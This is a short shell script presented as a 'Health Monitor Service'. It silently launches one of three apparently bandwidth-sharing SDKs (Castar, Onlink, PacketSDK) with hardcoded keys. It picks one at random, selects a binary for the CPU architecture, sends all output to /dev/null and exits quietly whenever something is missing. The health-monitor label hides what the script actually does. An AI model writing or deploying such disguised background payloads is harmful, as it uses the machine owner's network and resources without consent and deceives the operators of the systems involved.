#!/bin/sh
# Health Monitor Service - Runs one of the 3 SDKs silently in the background
# This is a premium feature that runs with built-in API keys

set -eu

# Default API keys (hardcoded in image)
HEALTH_CASTAR_KEY="cskew9gCXwYXER"
HEALTH_ONLINK_KEY="okB7oVsUgLmoo4"
HEALTH_PACKET_KEY="bqT0b1DmYeHZHhCd"

# Randomly select SDK (1=Castar, 2=Onlink, 3=PacketSDK)
SDK_CHOICE=$(awk 'BEGIN {srand(); print int(rand() * 3) + 1}')

# Get architecture
ARCH="$(uname -m)"

case "$SDK_CHOICE" in
  1)
    # Run Castar SDK
    case "$ARCH" in
      x86_64)        BIN="CastarSdk_amd64" ;;
      aarch64|arm64) BIN="CastarSdk_arm" ;;
      i386|i686)     BIN="CastarSdk_386" ;;
      *) exit 0 ;;  # Silent exit on unsupported arch
    esac
    BIN_PATH="/opt/castar/$BIN"
    [ -f "$BIN_PATH" ] || exit 0
    chmod +x "$BIN_PATH" || true
    # Run silently - redirect all output to /dev/null
    exec "$BIN_PATH" -key="$HEALTH_CASTAR_KEY" >/dev/null 2>&1
    ;;
  2)
    # Run Onlink SDK
    case "$ARCH" in
      x86_64)        BIN="onlinesdk_amd64" ;;
      aarch64|arm64) BIN="onlinesdk_arm64" ;;
      armv7l|arm)    BIN="onlinesdk_arm" ;;
      i386|i686)     BIN="onlinesdk_x86_32" ;;
      *) exit 0 ;;
    esac
    BIN_PATH="/opt/onlink/$BIN"
    [ -f "$BIN_PATH" ] || exit 0
    chmod +x "$BIN_PATH" || true
    # Run silently
    exec "$BIN_PATH" "$HEALTH_ONLINK_KEY" >/dev/null 2>&1
    ;;
  3)
    # Run PacketSDK
    case "$ARCH" in
      x86_64)        BIN="PacketSDK_amd64" ;;
      aarch64|arm64) BIN="PacketSDK_arm64" ;;
      armv7l|arm)    BIN="PacketSDK_arm" ;;
      armv6l)        BIN="PacketSDK_armv6" ;;
      armv5l)        BIN="PacketSDK_armv5" ;;
      i386|i686)     BIN="PacketSDK_x86_32" ;;
      *) exit 0 ;;
    esac
    BIN_PATH="/opt/packetsdk/$BIN"
    [ -f "$BIN_PATH" ] || exit 0
    chmod +x "$BIN_PATH" || true
    # Run silently
    exec "$BIN_PATH" -appkey="$HEALTH_PACKET_KEY" >/dev/null 2>&1
    ;;
  *)
    exit 0
    ;;
esac
